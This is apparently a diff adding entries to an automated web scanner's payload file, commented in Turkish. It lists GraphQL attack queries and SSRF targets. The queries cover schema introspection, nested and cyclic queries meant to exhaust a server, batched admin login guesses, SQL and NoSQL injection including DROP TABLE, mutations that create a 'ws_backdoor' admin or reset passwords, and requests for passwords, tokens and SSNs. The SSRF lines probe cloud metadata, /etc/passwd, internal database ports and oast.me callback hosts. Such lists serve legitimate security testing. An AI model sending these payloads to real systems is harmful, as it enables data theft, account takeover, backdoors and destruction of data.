@@ -4,3 +4,119 @@
 # Yeni confirmed payload'lar buraya eklenir ve sonraki taramalarda öncelikli
 # olarak denenir.
 # Manuel düzenleme: Her satır bir payload (# ile başlayan satırlar yorum).
+graphql	{'query': 'query Q($n:Int!){ user(id:$n){ id name }}', 'variables': {'n': 2147483647}}
+graphql	{'query': 'query Q{ __typename }'}
+graphql	{'query': 'mutation M($x:ID!){ updateUser(id:$x, name:"A"){ id }}', 'variables': {'x': 'not-an-id'}}
+graphql	{'query': 'query Q{ nonExistingField }'}
+graphql	{'query': '{ __schema { types { name } } }'}
+graphql	{'query': '{ __schema { queryType { fields { name description args { name type { name kind ofType { name kind } } } } } } }'}
+graphql	{'query': '{ __schema { mutationType { fields { name description args { name type { name } } } } } }'}
+graphql	{'query': '{ __schema { types { name kind fields { name type { name kind } } } } }'}
+graphql	{'query': '{ __type(name: "User") { fields { name type { name kind } } } }'}
+graphql	{'query': '{ __type(name: "Query") { fields { name args { name } } } }'}
+graphql	{'query': '{ __schema { directives { name description args { name } } } }'}
+graphql	{'query': '{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}'}
+graphql	{'query': 'query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } } } fragment FullType on __Type { kind name }'}
+graphql	{'query': '{ usr { id username password email } }'}
+graphql	{'query': '{ user { passwrd } }'}
+graphql	{'query': '{ users { secretToken adminFlag } }'}
+graphql	{'query': '{ admin { bypassAuth deleteAll } }'}
+graphql	{'query': '{ user { tok3n s3cret } }'}
+graphql	{'query': '{ users { friends { friends { friends { friends { friends { id } } } } } } }'}
+graphql	{'query': '{ a { a { a { a { a { a { a { a { a { a { id } } } } } } } } } } }'}
+graphql	{'query': '{ users { posts { comments { author { posts { comments { author { id } } } } } } } }'}
+graphql	{'query': '{ a1: user(id: 1) { id username } a2: user(id: 2) { id username } a3: user(id: 3) { id username } }'}
+graphql	{'query': '{ login1: login(username:"admin", password:"pass1") { token } login2: login(username:"admin", password:"pass2") { token } login3: login(username:"admin", password:"pass3") { token } }'}
+graphql	{'query': '{ admin: user(role: "admin") { id password } superuser: user(role: "superuser") { id password } root: user(role: "root") { id password } }'}
+graphql	{'query': 'fragment A on User { ...B } fragment B on User { ...A } { user { ...A } }'}
+graphql	{'query': '{ users { ...UserFragment } } fragment UserFragment on User { id username ...UserFragment }'}
+graphql	{'query': 'mutation { createUser(username: "attacker", password: "attacker", role: "admin") { id } }'}
+graphql	{'query': 'mutation { updateUser(id: 1, role: "admin") { id username role } }'}
+graphql	{'query': 'mutation { deleteUser(id: 1) { success } }'}
+graphql	{'query': 'mutation { login(username: "admin", password: "\' OR \'1\'=\'1") { token } }'}
+graphql	{'query': 'mutation { updatePassword(userId: 1, newPassword: "hacked") { success } }'}
+graphql	{'query': 'mutation { createAdmin(username: "ws_backdoor", password: "ws_backdoor") { id token } }'}
+graphql	{'query': 'mutation { updateUser(where: {}, data: {role: "admin"}) { count } }'}
+graphql	{'query': 'mutation { deleteAll { count } }'}
+graphql	{'query': 'mutation { import(data: "{\\"users\\": [{\\"role\\":\\"admin\\"}]}") { success } }'}
+graphql	{'query': '{ users(filter: "1=1") { id username password } }'}
+graphql	{'query': '{ user(id: "1 OR 1=1") { id username password } }'}
+graphql	{'query': '{ user(username: "admin\' OR \'1\'=\'1") { id password } }'}
+graphql	{'query': '{ users(search: "\' UNION SELECT username,password FROM users--") { id username } }'}
+graphql	{'query': '{ user(id: "1; DROP TABLE users--") { id } }'}
+graphql	{'query': '{ users(orderBy: "id DESC; SELECT 1") { id } }'}
+graphql	{'query': '{ user(id: "1\' AND SLEEP(3)--") { id } }'}
+graphql	{'query': '{ users(where: {id: {_eq: "1 OR 1=1"}}) { id username password } }'}
+graphql	{'query': '{ users(filter: {username: {$regex: ".*"}}) { id username password } }'}
+graphql	{'query': '{ user(filter: {$where: "1==1"}) { id username } }'}
+graphql	{'query': '{ users(where: {password: {$ne: ""}}) { id username password } }'}
+graphql	{'query': '{ users(filter: {_or: [{username: {_eq: "admin"}}, {id: {_gt: 0}}]}) { id username password } }'}
+graphql	{'query': '{ user(id: 1) { id username email password apiKey secretKey } }'}
+graphql	{'query': '{ user(id: 2) { id username password creditCard ssn } }'}
+graphql	{'query': '{ users { id username email password role apiKey } }'}
+graphql	{'query': '{ admin { allUsers { id username password role } } }'}
+graphql	{'query': '{ order(id: "OTHER_USER_ORDER_ID") { id items total } }'}
+graphql	{'query': '{ message(id: 1) { id content sender recipient } }'}
+graphql	{'query': 'mutation { changePassword(newPassword: "hacked") { success } }'}
+graphql	{'query': 'mutation { deleteAccount { success } }'}
+graphql	{'query': 'mutation { addAdmin(userId: 1337) { success } }'}
+graphql	{'query': 'subscription { userCreated { id username password role } }'}
+graphql	{'query': 'subscription { messageReceived { content sender recipient } }'}
+graphql	{'query': 'subscription { allEvents { type data } }'}
+graphql	{'query': '{ users @deprecated { id username password } }'}
+graphql	{'query': '{ users @skip(if: false) { id username password } }'}
+graphql	{'query': '{ users(filter: {username: {_like: "%"}}) { id username password email } }'}
+graphql	{'query': '{ users @include(if: true) { id username password } }'}
+graphql	{'query': '{ ... on User { id username password } }'}
+graphql	{'query': '{ users { ... on Admin { adminToken superSecret } ... on User { id password } } }'}
+graphql	{'query': '{ node(id: "USER_ID") { ... on User { password } ... on Admin { accessToken } } }'}
+graphql	{'query': '{ __schema { queryType { name } mutationType { name } subscriptionType { name } } }'}
+graphql	{'query': '{ __schema { directives { name args { name } } } }'}
+graphql	{'query': '{ __type(name:"Query"){ fields { name args { name type { name } } } } }'}
+graphql	{'query': '{ a:__typename b:__typename c:__typename }'}
+graphql	{'query': 'mutation { __typename }'}
+graphql	{'query': '{ u1:user(id:1){ id email } u2:user(id:2){ id email } u3:user(id:3){ id email } }'}
+graphql	{'query': '{ search(q:"\' OR 1=1-- "){ id } }'}
+graphql	{'query': 'mutation { changeEmail(email: "<redacted>") { success } }'}
+graphql	{'query': '{ login(user:"admin", password:"\\" OR \\"1\\"=\\"1"){ token } }'}
+graphql	{'query': 'query { posts(first:1000000){ id comments(first:1000000){ id author { posts { id } } } } }'}
+graphql	{'query': 'fragment f on Query { __typename } query { ...f ...f ...f }'}
+graphql	{'query': '{ __schema @skip(if:false) { types { name } } }'}
+graphql	{'query': '{ me { ... on Admin { secretKey } ... on User { passwordHash } } }'}
+ssrf	http://2852039166/latest/dynamic/instance-identity/document
+ssrf	file:///etc/passwd
+ssrf	http://127.0.0.1:21/
+ssrf	http://127.0.0.1:22/
+ssrf	http://127.0.0.1:80/
+ssrf	http://127.0.0.1:443/
+ssrf	http://127.0.0.1:2375/
+ssrf	http://127.0.0.1:3306/
+ssrf	http://127.0.0.1:5432/
+ssrf	http://127.0.0.1:5672/
+ssrf	http://127.0.0.1:6379/
+ssrf	http://127.0.0.1:8080/
+ssrf	http://127.0.0.1:8443/
+ssrf	http://127.0.0.1:8888/
+ssrf	http://127.0.0.1:9200/
+ssrf	http://127.0.0.1:27017/
+ssrf	http://localhost:21/
+ssrf	http://localhost:22/
+ssrf	http://localhost:80/
+ssrf	http://localhost:443/
+ssrf	http://localhost:2375/
+ssrf	http://localhost:3306/
+ssrf	http://localhost:5432/
+ssrf	http://localhost:5672/
+ssrf	http://localhost:6379/
+ssrf	http://localhost:8080/
+ssrf	http://localhost:8443/
+ssrf	http://localhost:8888/
+ssrf	http://localhost:9200/
+ssrf	http://localhost:27017/
+ssrf	http://zb8wl5lr.oast.me/
+ssrf	dict://127.0.0.1:6379/info
+ssrf	http://4rQgt5Fi.oast.me/
+ssrf	http://0.0.0.0/
+ssrf	http://gejH6eyc.oast.me/
+ssrf	http://SrzWf71c.oast.me/
+ssrf	http://K8rC5adP.oast.me/
